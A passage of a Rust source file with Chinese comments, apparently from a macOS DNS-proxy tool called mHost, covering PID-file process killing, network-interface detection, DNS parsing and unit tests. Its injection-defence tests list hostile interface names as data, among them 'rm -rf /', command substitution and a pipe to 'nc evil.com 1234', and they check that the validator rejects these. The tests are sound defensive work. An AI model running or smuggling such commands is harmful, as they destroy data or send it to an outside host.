    // Issue #163：helper 内部 SIGTERM → SIGKILL 升级。返回 `Killed` 才说明
    // 真有进程被强退（之前只用 SIGTERM，trap 后留 zombie 不可见）。
    let outcome = kill_proxy_via_pid_file(&pid_path);
    if outcome == KillOutcome::Killed {
        eprintln!(
            "[mHost] Killed stale dns-proxy process via {}",
            pid_path.display()
        );
    }
    // 与旧行为兼容：启动清理永远该清 PID 文件（无论是否真的 kill）。
    let _ = std::fs::remove_file(pid_path);
}

/// Issue #163 + #81 综合 helper：
///   - 读 PID 文件（"{pid} {binary_path}\n"，#81 安全格式）
///   - `kill(pid, 0)` 检查存活
///   - `ps -p <pid> -o comm=` 校验进程 basename 与 recorded binary_path
///     basename **精确相等**（#81 防御 PID 重用）
///   - 仅在匹配时 SIGTERM → 150ms → SIGKILL 升级
///
/// **为什么 SIGKILL 升级**：disable 路径下 proxy 可能 trap SIGTERM 或卡在
/// 阻塞 syscall（`restore_dns_and_exit` 内部的 `std::process::Command::output()`
/// 无超时）。150ms 给 Rust runtime / tokio 时间反应；不响应就强退，避免下次
/// enable 拿到 `EADDRINUSE` (os error 48)。
///
/// **为什么不删 PID 文件**：disable 路径 caller 已经在集中清理一组 temp 文件
/// （pid / original / signal / marker），成败分支对 marker 处理不同；让 helper
/// 不动 PID 文件，caller 一次性统一处理更可读。
///
/// **fix（issue #163 re-fix, role demoted）**：原 PR #164 把此 helper 作为
/// disable 5s 超时分支的 **主** kill 路径。实测发现：proxy 以 root 跑时，
/// 用户态 `kill(pid, SIGKILL)` 静默 EPERM，proxy 不死。修法是 disable
/// 5s 超时分支改成在 `build_disable_script` 生成的 sudo 脚本里 kill；
/// 本 helper 退化为：
/// - **fast-path**：用户态 kill 能成功时（proxy 是用户态跑）直接干掉，
///   省一次 sudo 弹窗
/// - **defense-in-depth**：root proxy 时 EPERM 失败，无副作用
/// - **startup cleanup**：`cleanup_stale_proxy` 仍用它，避开 startup
///   sudo 弹窗
///
/// helper 自身契约（SIGTERM → SIGKILL、`#81` comm 校验、不删 PID 文件）
/// 不变。disable 路径的主杀是 `osascript_restore` 里的 sudo 脚本，
/// 不是这个 helper。
///
/// **fix (PR #164 review concern #5)**：SIGKILL 后会 best-effort 调
/// `waitpid(pid, &mut status, WNOHANG)` 尝试 reap zombie。仅在当前进程
/// 是目标进程的父进程时生效（生产里 proxy 通常由 osascript-spawned sh
/// 启动，父进程不是 mhost → waitpid 返回 ECHILD，silently ignored）；
/// 本地测试 cargo test 是父进程 → reap 成功。这是 cleanup 而不是
/// 正确性契约：reap 不成功不影响 `KillOutcome::Killed` 的语义。
fn kill_proxy_via_pid_file(pid_file: &Path) -> KillOutcome {
    // 1. 读 PID 文件 + parse "{pid} {binary_path}"
    let content = match std::fs::read_to_string(pid_file) {
        Ok(c) => c,
        Err(_) => return KillOutcome::FileMissing,
    };
    let mut parts = content.split_whitespace();
    let Some(pid_str) = parts.next() else {
        return KillOutcome::FileMissing;
    };
    let Ok(pid) = pid_str.parse::<u32>() else {
        return KillOutcome::FileMissing;
    };
    // 即使老格式（仅 PID，no binary），recorded_binary 为空 → expected_comm
    // 为空 → is_proxy 永远 false → 安全 no-op，与旧 `cleanup_stale_proxy`
    // 行为一致。
    let recorded_binary: String = parts.collect::<Vec<_>>().join(" ");

    // 2. liveness
    let alive = unsafe { libc::kill(pid as libc::pid_t, 0) == 0 };
    if !alive {
        return KillOutcome::PidDeadAlready;
    }

    // 3. exact-match comm 校验（与 cleanup_stale_proxy 同款语义）
    let expected_comm = std::path::Path::new(&recorded_binary)
        .file_name()
        .map(|s| s.to_string_lossy().to_string())
        .unwrap_or_else(|| recorded_binary.clone());
    if expected_comm.is_empty() {
        return KillOutcome::PidReusedOrMismatch;
    }
    let is_proxy = match Command::new("ps")
        .args(["-p", &pid.to_string(), "-o", "comm="])
        .output()
    {
        Ok(out) if out.status.success() => {
            let comm = String::from_utf8_lossy(&out.stdout);
            let comm_basename = std::path::Path::new(comm.trim())
                .file_name()
                .map(|s| s.to_string_lossy().to_string())
                .unwrap_or_else(|| comm.trim().to_string());
            comm_basename == expected_comm
        }
        _ => false,
    };
    if !is_proxy {
        return KillOutcome::PidReusedOrMismatch;
    }

    // 4. SIGTERM → 150ms → SIGKILL 升级
    unsafe {
        libc::kill(pid as libc::pid_t, libc::SIGTERM);
    }
    std::thread::sleep(std::time::Duration::from_millis(150));
    if unsafe { libc::kill(pid as libc::pid_t, 0) } == 0 {
        unsafe {
            libc::kill(pid as libc::pid_t, libc::SIGKILL);
        }
    }

    // **fix (PR #164 review concern #5)**：SIGKILL 后 best-effort reap
    // zombie。如果当前进程是目标的父进程，`waitpid(pid, ..., WNOHANG)`
    // 会立即 reap 已死子进程，避免它以 zombie 形态继续占用 PID 表项；
    // 后续 caller 的 `kill(pid, 0)` 才能看到 ESRCH（PID 真释放）而不是
    // 0（zombie 仍可见）。生产里 proxy 的父进程通常是 `osascript` 起的
    // sh，不一定是当前 mhost 进程 —— 此时 waitpid 返回 0 (ECHILD)，
    // 我们 ignore 这条路径：那是 osascript-spawned sh 的 reap 责任，
    // 这里只 best-effort。能 reap 更好，不能也无害。
    let _ = unsafe {
        let mut status: libc::c_int = 0;
        libc::waitpid(pid as libc::pid_t, &mut status, libc::WNOHANG)
    };

    KillOutcome::Killed
}

/// `kill_proxy_via_pid_file` 的返回结果。disable 路径 caller 用它来决定
/// 日志级别 / 是否上报；不携带 Err —— I/O 错误折叠成 `FileMissing`，ps
/// 失败折叠成 `PidReusedOrMismatch`（保守：宁可漏杀也不误杀）。
#[derive(Debug, PartialEq, Eq)]
enum KillOutcome {
    /// SIGTERM 或 SIGKILL 成功发出 —— PID 文件上的进程已死。
    Killed,
    /// liveness 通过但 comm 不匹配 —— PID 被重用，#81 安全网生效，没杀。
    PidReusedOrMismatch,
    /// `kill(pid, 0)` 返回非 0 —— 进程已死但 PID 文件没清。
    PidDeadAlready,
    /// PID 文件不存在或不可解析（race / trap 已清）。
    FileMissing,
}

/// 获取当前活跃的网络接口名（Hardware Port）。
/// **fix（proxy self-cleanup）**：proxy 调 networksetup 时也要拿接口，
/// 所以改 pub 让 proxy 复用。
pub fn get_active_network_interface() -> Result<String, PlatformError> {
    // 1. 获取默认路由对应的设备名（如 en0）
    let route_output = Command::new("route")
        .args(["-n", "get", "default"])
        .output()
        .map_err(|e| PlatformError::DetectInterface(format!("route command failed: {}", e)))?;

    if !route_output.status.success() {
        let stderr = String::from_utf8_lossy(&route_output.stderr);
        return Err(PlatformError::DetectInterface(format!(
            "route failed: {}",
            stderr
        )));
    }

    let route_stdout = String::from_utf8_lossy(&route_output.stdout);
    let device = parse_route_interface(&route_stdout).ok_or_else(|| {
        PlatformError::DetectInterface("could not parse default interface from route output".into())
    })?;

    // 2. 通过 networksetup 找到设备名对应的 Hardware Port
    let list_output = Command::new("networksetup")
        .args(["-listallhardwareports"])
        .output()
        .map_err(|e| {
            PlatformError::DetectInterface(format!("networksetup command failed: {}", e))
        })?;

    if !list_output.status.success() {
        let stderr = String::from_utf8_lossy(&list_output.stderr);
        return Err(PlatformError::DetectInterface(format!(
            "networksetup failed: {}",
            stderr
        )));
    }

    let list_stdout = String::from_utf8_lossy(&list_output.stdout);
    let port = parse_hardware_port(&list_stdout, &device).ok_or_else(|| {
        PlatformError::DetectInterface(format!("no hardware port found for device '{}'", device))
    })?;
    // 验证接口名（防御 networksetup 输出被恶意修改/异常字符）
    validate_interface_name(&port)?;
    Ok(port)
}

/// 从 `route -n get default` 输出中解析接口设备名。
fn parse_route_interface(output: &str) -> Option<String> {
    for line in output.lines() {
        let line = line.trim();
        if line.starts_with("interface:") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                return Some(parts[1].to_string());
            }
        }
    }
    None
}

/// 从 `networksetup -listallhardwareports` 输出中根据设备名查找 Hardware Port。
fn parse_hardware_port(output: &str, device: &str) -> Option<String> {
    let mut current_port: Option<String> = None;

    for line in output.lines() {
        let line = line.trim();
        if let Some(stripped) = line.strip_prefix("Hardware Port:") {
            let port = stripped.trim().to_string();
            current_port = Some(port);
        } else if let Some(stripped) = line.strip_prefix("Device:") {
            let dev = stripped.trim();
            if dev == device {
                return current_port.clone();
            }
        }
    }

    None
}

/// 从 `networksetup -getdnsservers` 输出中解析 DNS 服务器列表。
fn parse_dns_servers(output: &str) -> Result<Vec<String>, PlatformError> {
    let trimmed = output.trim();

    if trimmed.contains("There aren't any DNS Servers set")
        || trimmed.is_empty()
        || trimmed == "Empty"
    {
        return Ok(vec![]);
    }

    let servers: Vec<String> = trimmed
        .lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty())
        .collect();

    Ok(servers)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::os::unix::fs::PermissionsExt;

    // -----------------------------------------------------------------------
    // Runtime dir + signal file perm tests（fix H1, issue #90）
    // -----------------------------------------------------------------------

    /// 回归测试（H1）：runtime dir 路径受 `MHOST_RUNTIME_DIR` 环境变量控制。
    /// 测试场景：env var 指向 tempdir → 所有 *file() 函数都返回该目录下路径。
    #[test]
    fn test_runtime_dir_respects_env_var() {
        let _guard = serial_runtime_dir_test();
        let dir = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        let rdir = runtime_dir();
        assert_eq!(rdir, dir.path(), "runtime_dir 应等于 MHOST_RUNTIME_DIR");

        assert_eq!(
            original_dns_file(),
            dir.path().join("mhost-dns-original.txt")
        );
        assert_eq!(
            shutdown_signal_file(),
            dir.path().join("mhost-dns-shutdown.signal")
        );
        assert_eq!(
            disable_recovery_marker_file(),
            dir.path().join("mhost-dns-disable-recovery.marker")
        );
        assert_eq!(proxy_pid_file(), dir.path().join("mhost-dns-proxy.pid"));

        std::env::remove_var("MHOST_RUNTIME_DIR");
    }

    /// 回归测试（H1）：ensure_runtime_dir 创建目录并设 mode 0o700。
    #[test]
    fn test_ensure_runtime_dir_creates_with_0o700() {
        let _guard = serial_runtime_dir_test();
        let parent = tempfile::tempdir().unwrap();
        let target = parent.path().join("runtime");
        std::env::set_var("MHOST_RUNTIME_DIR", &target);

        // 初始不存在
        assert!(!target.exists());

        let result = ensure_runtime_dir().expect("ensure_runtime_dir 失败");
        assert_eq!(result, target);
        assert!(target.exists());

        let meta = std::fs::metadata(&target).expect("stat 失败");
        let mode = meta.permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o700,
            "runtime dir 权限应为 0o700（owner-only），实际 0o{:o}",
            mode
        );

        std::env::remove_var("MHOST_RUNTIME_DIR");
    }

    /// 回归测试（H1）：`write_signal_file` 创建的临时文件 + rename 后目标
    /// 文件都是 0o600（owner-only）。这是从 0o666 收紧后的关键修复。
    #[test]
    fn test_write_signal_file_creates_with_0o600() {
        let _guard = serial_runtime_dir_test();
        let dir = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        let target = shutdown_signal_file();
        write_signal_file(&target, "running").expect("write_signal_file 失败");

        // 关键断言：file 权限 = 0o600（owner read/write）
        let meta = std::fs::metadata(&target).expect("stat 失败");
        let mode = meta.permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o600,
            "signal file 权限应为 0o600（owner-only），实际 0o{:o}",
            mode
        );

        // 内容一致
        let content = std::fs::read_to_string(&target).unwrap();
        assert_eq!(content, "running");

        std::env::remove_var("MHOST_RUNTIME_DIR");
    }

    /// 回归测试（H1）：原子写流程正确 —— 写完后不应有 `<file>.tmp` 残留。
    #[test]
    fn test_write_signal_file_no_tmp_residue() {
        let _guard = serial_runtime_dir_test();
        let dir = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        let target = shutdown_signal_file();
        write_signal_file(&target, "shutdown").unwrap();

        let tmp = dir.path().join(format!(
            "{}.tmp",
            target.file_name().unwrap().to_str().unwrap()
        ));
        assert!(
            !tmp.exists(),
            "原子写完成后 tmp 文件应被 rename 替换，不应残留"
        );

        std::env::remove_var("MHOST_RUNTIME_DIR");
    }

    /// 回归测试（H1）：`write_atomic_0600` 是 pub(crate) helper，被多个
    /// signal/state 文件复用，统一保证 0o600 + atomic rename + sync。
    #[test]
    fn test_write_atomic_0600_helper() {
        let _guard = serial_runtime_dir_test();
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test-state.bin");
        write_atomic_0600(&path, b"hello atomic").expect("write 失败");

        let meta = std::fs::metadata(&path).unwrap();
        assert_eq!(meta.permissions().mode() & 0o777, 0o600);
        assert_eq!(std::fs::read(&path).unwrap(), b"hello atomic");
    }

    /// 回归测试（H1）：老 /tmp 路径的孤儿文件被 cleanup_legacy_tmp_files 清掉。
    /// 模拟升级场景：先在 /tmp 留一个假文件（默认 umask → 0o644 → 任何用户可读），
    /// 然后调 cleanup → 文件应被删。
    #[test]
    fn test_cleanup_legacy_tmp_files_removes_orphans() {
        let _guard = serial_runtime_dir_test();
        // 注意：这些测试路径用真 /tmp，因为 cleanup_legacy_tmp_files 写死了
        // 老路径常量。我们只测"创建 → cleanup → 不存在" 的 round-trip。
        // 并行测试可能 race：在 cleanup 之后不要期望文件存在；cleanup 之前
        // 的 write 也可能被别的测试 cleanup 掉。简化：只验证 cleanup 本身
        // 对已存在的文件是 idempotent 的（多次调用都不 panic）。
        for path in [
            "/tmp/mhost-dns-proxy.pid",
            "/tmp/mhost-dns-original.txt",
            "/tmp/mhost-dns-shutdown.signal",
            "/tmp/mhost-dns-disable-recovery.marker",
        ] {
            // 调用两次：第二次应 no-op
            cleanup_legacy_tmp_files();
            cleanup_legacy_tmp_files();
            // 文件可能本来就不存在，cleanup 应 silently 忽略
            let _ = std::fs::remove_file(path);
        }
        // 主要断言：调用不 panic 且返回 Ok
    }

    /// 串行化 runtime dir 相关测试的 helper。**fix H1**：之前用本地
    /// `serial_runtime_dir_test` mutex，与 proxy.rs 测试的 `TEST_LOCK`
    /// 不同 —— 两边同时改 `MHOST_RUNTIME_DIR` 会 race，导致测试
    /// 读写错的路径。统一用 `proxy::tests::TEST_LOCK` 保证串行化。
    fn serial_runtime_dir_test() -> std::sync::MutexGuard<'static, ()> {
        crate::proxy::tests::test_lock()
    }

    // -----------------------------------------------------------------------
    // parse_route_interface tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_parse_route_interface_en0() {
        let output = r#"
   route to: default
destination: default
       mask: default
    gateway: 192.168.1.1
  interface: en0
      flags: <UP,GATEWAY,DONE,STATIC,PRCLONING>
 recvpipe  sendpipe  ssthresh  rtt,msec    rttvar  hopcount      mtu     expire
       0         0         0         0         0         0      1500         0
"#;
        assert_eq!(parse_route_interface(output), Some("en0".to_string()));
    }

    #[test]
    fn test_parse_route_interface_missing() {
        let output = "no interface here";
        assert_eq!(parse_route_interface(output), None);
    }

    // -----------------------------------------------------------------------
    // parse_hardware_port tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_parse_hardware_port_wifi() {
        let output = r#"
Hardware Port: Wi-Fi
Device: en0
Ethernet Address: aa:bb:cc:dd:ee:ff

Hardware Port: Ethernet
Device: en1
Ethernet Address: 11:22:33:44:55:66
"#;
        assert_eq!(
            parse_hardware_port(output, "en0"),
            Some("Wi-Fi".to_string())
        );
    }

    #[test]
    fn test_parse_hardware_port_ethernet() {
        let output = r#"
Hardware Port: Wi-Fi
Device: en0
Ethernet Address: aa:bb:cc:dd:ee:ff

Hardware Port: Ethernet
Device: en1
Ethernet Address: 11:22:33:44:55:66
"#;
        assert_eq!(
            parse_hardware_port(output, "en1"),
            Some("Ethernet".to_string())
        );
    }

    #[test]
    fn test_parse_hardware_port_not_found() {
        let output = r#"
Hardware Port: Wi-Fi
Device: en0
"#;
        assert_eq!(parse_hardware_port(output, "en99"), None);
    }

    // -----------------------------------------------------------------------
    // parse_dns_servers tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_parse_dns_servers_empty() {
        let cases = vec![
            ("none_set", "There aren't any DNS Servers set on Wi-Fi."),
            ("empty_string", ""),
            ("empty_keyword", "Empty"),
        ];

        for (name, input) in cases {
            let result = parse_dns_servers(input).unwrap();
            assert!(result.is_empty(), "case: {}", name);
        }
    }

    #[test]
    fn test_parse_dns_servers_single() {
        let output = "8.8.8.8\n";
        let result = parse_dns_servers(output).unwrap();
        assert_eq!(result, vec!["8.8.8.8"]);
    }

    #[test]
    fn test_parse_dns_servers_multiple() {
        let output = "8.8.8.8\n8.8.4.4\n1.1.1.1\n";
        let result = parse_dns_servers(output).unwrap();
        assert_eq!(result, vec!["8.8.8.8", "8.8.4.4", "1.1.1.1"]);
    }

    #[test]
    fn test_parse_dns_servers_with_whitespace() {
        let output = "  8.8.8.8  \n\n  1.1.1.1  \n";
        let result = parse_dns_servers(output).unwrap();
        assert_eq!(result, vec!["8.8.8.8", "1.1.1.1"]);
    }

    // -----------------------------------------------------------------------
    // 上游 loopback 过滤测试（fix issue #103）
    // -----------------------------------------------------------------------

    #[test]
    fn test_is_local_resolver_ipv4() {
        // 127.0.0.0/8 整段都是 loopback
        assert!(is_local_resolver("127.0.0.1"));
        assert!(is_local_resolver("127.5.5.5"));
        assert!(is_local_resolver("127.255.255.254"));
        // 0.0.0.0 是 unspecified
        assert!(is_local_resolver("0.0.0.0"));
        // 真实公网 / 内网 IP 不算本机
        assert!(!is_local_resolver("8.8.8.8"));
        assert!(!is_local_resolver("1.1.1.1"));
        assert!(!is_local_resolver("192.168.1.1"));
        assert!(!is_local_resolver("10.0.0.1"));
    }

    #[test]
    fn test_is_local_resolver_ipv6() {
        // ::1 loopback / :: unspecified
        assert!(is_local_resolver("::1"));
        assert!(is_local_resolver("::"));
        // 真实 / 文档段 v6 不算本机
        assert!(!is_local_resolver("2001:db8::1"));
        assert!(!is_local_resolver("fe80::1"));
    }

    #[test]
    fn test_is_local_resolver_with_port() {
        // v4 + port
        assert!(is_local_resolver("127.0.0.1:53"));
        assert!(is_local_resolver("127.0.0.1:1053"));
        assert!(is_local_resolver("127.0.0.1:5353")); // mDNSResponder 端口
        assert!(!is_local_resolver("8.8.8.8:53"));
        // v6 + port（bracketed）：这种才是 RFC 标准的写法
        assert!(is_local_resolver("[::1]:53"));
        assert!(is_local_resolver("[::]:53"));
        assert!(!is_local_resolver("[2001:db8::1]:53"));
        // 注：`"::1:53"`（无方括号）会被 Rust 解析成 v6 地址 ::1:53
        // （= 0:0:0:0:0:0:1:53），这不是 loopback。这种歧义不是我们
        // 这个 helper 要解决的，靠调用方不要这么传就行。
    }

    #[test]
    fn test_is_local_resolver_garbage_input() {
        // 解析不出来的字符串 → 按「非本地」处理，让上层常规校验兜底
        assert!(!is_local_resolver(""));
        assert!(!is_local_resolver("not-an-ip"));
        assert!(!is_local_resolver("..."));
        assert!(!is_local_resolver("evil.example.com"));
    }

    #[test]
    fn test_parse_dns_servers_then_filter_loopback() {
        // 模拟 `networksetup -getdnsservers` 在 DNS 模式启用后的输出：
        // Tier 1 把 mHost 自己的代理地址也列出来了，必须被过滤掉，
        // 公共 fallback（这里用 1.1.1.1 模拟真实外部 DNS）要保留。
        let raw = parse_dns_servers("127.0.0.1\n1.1.1.1\n").unwrap();
        let filtered: Vec<String> = raw.into_iter().filter(|s| !is_local_resolver(s)).collect();
        assert_eq!(filtered, vec!["1.1.1.1".to_string()]);

        // 全部是 loopback → 过滤后为空 → 调用方应继续走 Tier 2 / Tier 3
        let all_loopback = parse_dns_servers("127.0.0.1\n0.0.0.0\n").unwrap();
        let filtered_empty: Vec<String> = all_loopback
            .into_iter()
            .filter(|s| !is_local_resolver(s))
            .collect();
        assert!(filtered_empty.is_empty());
    }

    // -----------------------------------------------------------------------
    // select_upstream 集成测试（fix issue #103 — Tier 选择路径）
    //
    // 覆盖 `get_upstream_resolvers()` 的核心 fall-through 逻辑：
    //   - Tier 1 external → 用 Tier 1，source=Networksetup
    //   - Tier 1 全是 loopback → fall through 到 Tier 2，source=Ipconfig
    //   - Tier 2 也是 loopback → fall through 到 Tier 3，source=Public
    //   - Tier 1 部分 loopback（混合）→ 过滤后保留外部条目
    //   - 两 tier 都空 → 直接走 Tier 3
    //
    // 这是 issue #103 的核心回归路径：Tier 1 = [127.0.0.1] 时必须能
    // 走到 Tier 2 而不是直接返回 self-loop。
    // -----------------------------------------------------------------------

    #[test]
    fn test_select_upstream_tier1_external_returns_tier1() {
        let (result, source) =
            select_upstream(vec!["8.8.8.8".to_string()], vec!["192.168.1.1".to_string()]);
        assert_eq!(result, vec!["8.8.8.8".to_string()]);
        assert_eq!(source, UpstreamTier::Networksetup);
    }

    #[test]
    fn test_select_upstream_tier1_loopback_falls_to_tier2() {
        // 这是 issue #103 的核心场景：Tier 1 = [127.0.0.1]（mHost 自己的代理）
        // → 不能用，必须 fall through 到 Tier 2 (ipconfig DHCP-pushed)。
        let (result, source) = select_upstream(
            vec!["127.0.0.1".to_string()],
            vec!["192.168.1.1".to_string()],
        );
        assert_eq!(result, vec!["192.168.1.1".to_string()]);
        assert_eq!(source, UpstreamTier::Ipconfig);
    }

    #[test]
    fn test_select_upstream_tier2_loopback_falls_to_tier3() {
        // Tier 1 和 Tier 2 都是 loopback（防御性，正常情况不会出现）
        // → 走公共 fallback。
        let (result, source) =
            select_upstream(vec!["127.0.0.1".to_string()], vec!["0.0.0.0".to_string()]);
        assert_eq!(result, tier3_fallback());
        assert_eq!(source, UpstreamTier::Public);
    }

    #[test]
    fn test_select_upstream_tier1_partial_loopback_keeps_external() {
        // Tier 1 混合了 mHost 自己的 [127.0.0.1] 和真正的外部 DNS
        // （比如 WiFi 切换瞬间 networksetup 返回了旧 127.0.0.1 + 新 DHCP）
        // → 过滤掉 loopback，保留外部条目。
        let (result, source) =
            select_upstream(vec!["127.0.0.1".to_string(), "8.8.8.8".to_string()], vec![]);
        assert_eq!(result, vec!["8.8.8.8".to_string()]);
        assert_eq!(source, UpstreamTier::Networksetup);
    }

    #[test]
    fn test_select_upstream_both_empty_returns_tier3() {
        let (result, source) = select_upstream(vec![], vec![]);
        assert_eq!(result, tier3_fallback());
        assert_eq!(source, UpstreamTier::Public);
    }

    #[test]
    fn test_select_upstream_tier1_empty_falls_to_tier2() {
        // networksetup 失败 / 没接口 → Tier 1 空；用 Tier 2。
        let (result, source) =
            select_upstream(vec![], vec!["10.0.0.1".to_string(), "10.0.0.2".to_string()]);
        assert_eq!(result, vec!["10.0.0.1".to_string(), "10.0.0.2".to_string()]);
        assert_eq!(source, UpstreamTier::Ipconfig);
    }

    #[test]
    fn test_select_upstream_tier2_partial_loopback_keeps_external() {
        // Tier 1 空，Tier 2 混合 loopback 和外部 → 过滤掉 loopback，保留外部。
        let (result, source) = select_upstream(
            vec![],
            vec!["127.0.0.1".to_string(), "192.168.0.1".to_string()],
        );
        assert_eq!(result, vec!["192.168.0.1".to_string()]);
        assert_eq!(source, UpstreamTier::Ipconfig);
    }

    // -----------------------------------------------------------------------
    // 注入防护测试（fix #77）
    // -----------------------------------------------------------------------

    #[test]
    fn test_validate_interface_name_normal() {
        // macOS 合法接口名都应通过
        assert!(validate_interface_name("en0").is_ok());
        assert!(validate_interface_name("Wi-Fi").is_ok());
        assert!(validate_interface_name("USB 10/100/1000 LAN").is_ok());
        assert!(validate_interface_name("Thunderbolt Ethernet").is_ok());
        assert!(validate_interface_name("iPhone USB").is_ok());
    }

    #[test]
    fn test_validate_interface_name_injection() {
        // 任何 shell 元字符或控制字符都应拒绝
        let malicious = vec![
            "en0;evil",               // 命令分隔
            "Wi-Fi\";rm -rf /",       // 字符串闭合
            "en0$(whoami)",           // 命令替换
            "en0`id`",                // 反引号命令替换
            "en0 & rm -rf /",         // 后台进程
            "en0 | nc evil.com 1234", // 管道
            "en0 > /etc/hosts",       // 重定向
            "en0\n rm -rf /",         // 换行
            "en0\\rm -rf /",          // 反斜杠
            "en0!history",            // zsh 历史展开
            "en0'evil'",              // 单引号
            "en0(rm)",                // 子 shell
            "en0{rm,}",               // brace expansion
            "en0[rm]",                // glob
            "en0?rm",                 // glob 通配
            "en0*rm",                 // glob 通配
            "en0$PATH",               // 变量展开
            "en0%",                   // 作业控制
            "en0#comment",            // 注释
            "",                       // 空字符串
        ];
        for name in &malicious {
            let result = validate_interface_name(name);
            assert!(
                result.is_err(),
                "validate_interface_name({:?}) 应被拒绝，但接受了",
                name
            );
        }
    }

    #[test]
    fn test_write_temp_script_creates_executable() {
        use std::os::unix::fs::PermissionsExt;
        let content = "#!/bin/sh\necho hello world\n";
        let path = write_temp_script(content).expect("write_temp_script 失败");
        // 文件存在
        assert!(path.exists(), "临时脚本文件应存在: {:?}", path);
        // 权限 0o700
        let meta = std::fs::metadata(&path).expect("stat 失败");
        let mode = meta.permissions().mode();
        assert_eq!(
            mode & 0o777,
            0o700,
            "临时脚本权限应为 0o700，实际 0o{:o}",
            mode & 0o777
        );
        // 内容一致
        let read_back = std::fs::read_to_string(&path).expect("read 失败");
        assert_eq!(read_back, content, "临时脚本内容应一致");
        // 清理
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn test_parse_hardware_port_with_injection_chars() {
        // parse_hardware_port 不做白名单校验（它只解析 networksetup 输出），
        // 但 get_active_network_interface 拿到结果后会调用 validate_interface_name
        // 拒绝恶意名。本测试验证：parse_hardware_port 在遇到含 shell 元字符的
        // Hardware Port 时确实会原样返回（这正是白名单校验要兜底的攻击面）。
        let evil_output = r#"
Hardware Port: Wi-Fi"; rm -rf / #
Device: en0
Ethernet Address: aa:bb:cc:dd:ee:ff
"#;
        let port = parse_hardware_port(evil_output, "en0");
        assert_eq!(
            port,
            Some(r#"Wi-Fi"; rm -rf / #"#.to_string()),
            "parse_hardware_port 应原样返回（含注入字符的）端口名"
        );
        // 验证 validate_interface_name 拒绝这个值
        assert!(
            validate_interface_name(&port.unwrap()).is_err(),
            "validate_interface_name 应拒绝含注入字符的接口名"
        );
    }

    // -----------------------------------------------------------------------
    // PID 文件格式 + cleanup 校验测试（fix #81）
    // -----------------------------------------------------------------------

    #[test]
    fn test_pid_file_content_format() {
        // **fix（F1 + F2 + F4, PR #156 review）**：tests 直接调用
        // 生产 `build_enable_script(...)` 而不是自己 format! 一份脚本，
        // 防止「脚本改了测试还能过」的回归盲区。
        //
        // 验证内容：
        //   1. PID 文件写入用 `$PROXY_PID` + 完整 single-quoted 路径
        //   2. cleanup_stale_proxy 能用 `ps -p <pid> -o comm=` 校验 cmdline
        let proxy = PathBuf::from("/usr/local/bin/mhost-dns-proxy");
        let pid_file = PathBuf::from("/tmp/fake/pid file with space/mhost-dns-proxy.pid");
        let log_path = PathBuf::from("/tmp/fake/log path/mhost-dns-proxy.log");
        let script = build_enable_script(&EnableScriptInputs {
            proxy_path: &proxy,
            dns_port: 1053,
            pid_file: &pid_file,
            log_path: &log_path,
            interface: "Wi-Fi",
        });

        // PID 文件行：使用变量 `$PROXY_PID` + `$PROXY`，本身不带字面量路径；
        // 真正的字面量放在变量赋值（PROXY='...', PID_FILE='...'）里用 single-quote 包裹。
        assert!(
            script.contains(r#"echo "$PROXY_PID $PROXY" > "$PID_FILE""#),
            "PID file write must use $PROXY_PID + $PROXY + $PID_FILE variables (literal paths \
             belong in the assignment at the top, not here). Script:\n{script}",
        );
        // 同时：变量赋值必须用 single-quote（word-splitting 防御）
        assert!(
            script.contains(&format!(
                "PROXY={}",
                shell_single_quote("/usr/local/bin/mhost-dns-proxy")
            )),
            "PROXY must be assigned via single-quoted form to handle spaces"
        );
        assert!(
            script.contains(&format!(
                "PID_FILE={}",
                shell_single_quote(pid_file.to_string_lossy().as_ref())
            )),
            "PID_FILE must be assigned via single-quoted form (path has spaces)"
        );
    }

    /// 回归测试（issue #155 + F1 + F2, PR #156 review）：enable_dns_mode 脚本
    /// 必须包含所有安全层。**直接调用生产 builder**，防止测试改不到真实改动。
    ///
    /// 关键不变量：
    ///   1. `[ ! -x ... ]` 显式校验 binary 可执行（Layer 1）
    ///   2. `kill -0 $PROXY_PID` 探测 proxy 启动后是否还活着（Layer 2）
    ///   3. 探测失败时 cat log 到 stderr
    ///   4. PID 写入 echo 用 `$PROXY_PID` 而非 inline `$!`
    ///   5. **networksetup 必须在 kill -0 校验通过之后**
    ///   6. **EXIT trap 必须在 networksetup 前 + 注册**（F4：transactional）
    ///   7. **path 都用 single-quote 包裹**（F2：抵抗带空格路径）
    #[test]
    fn test_enable_script_contains_safety_layers() {
        let _guard = serial_runtime_dir_test();
        let dir = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        // 故意用带空格路径模拟「~/Library/Application Support/...」
        let proxy = PathBuf::from("/Users/test/Library/Application Support/mHost/mhost-dns-proxy");
        let pid_file = proxy_pid_file();
        let log_path = dir.path().join("log file with space.log");
        let interface = "Thunderbolt Ethernet";

        let script = build_enable_script(&EnableScriptInputs {
            proxy_path: &proxy,
            dns_port: 1053,
            pid_file: &pid_file,
            log_path: &log_path,
            interface,
        });

        // Layer 1: 显式可执行校验（带空格路径也必须 quoted）
        assert!(
            script.contains("[ ! -x \"$PROXY\" ]") && script.contains("exit 127"),
            "Layer 1 missing: script must early-fail with `exit 127` when binary is not executable"
        );

        // Layer 2: kill -0 探测 proxy 是否真 alive
        assert!(
            script.contains("kill -0 \"$PROXY_PID\""),
            "Layer 2 missing: kill -0 verification"
        );

        // Layer 3: 探测失败时把 log 内容 dump 到 stderr
        assert!(
            script.contains("cat \"$LOG_FILE\" >&2"),
            "Layer 3 missing: failure-path cat to stderr"
        );

        // Layer 4: 用 PROXY_PID 命名变量，不是 inline $!
        assert!(
            script.contains("PROXY_PID=$!"),
            "PROXY_PID must be named variable"
        );
        assert!(
            !script.contains("echo \"$! "),
            "inline `$! ...` would bypass the named PROXY_PID variable"
        );

